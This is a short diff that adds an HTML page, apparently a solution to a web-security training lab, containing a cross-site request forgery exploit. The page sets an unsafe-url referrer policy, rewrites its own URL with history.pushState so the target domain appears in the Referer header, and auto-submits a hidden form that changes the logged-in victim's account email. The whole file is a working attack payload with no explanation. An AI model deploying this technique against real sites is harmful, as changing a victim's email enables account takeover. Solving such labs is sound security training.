@@ -1,0 +1,16 @@
+<meta name="referrer" content="unsafe-url">
+<form id="autoForm" method="POST"
+      action="https://0a7a002a036623618027905b007d00eb.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="new-email-123@example.com">
+</form>
+
+<script>
+    history.pushState(
+        "",
+        "",
+        "/?0a7a002a036623618027905b007d00eb.web-security-academy.net"
+    );
+
+    document.getElementById("autoForm").submit();
+</script>
+
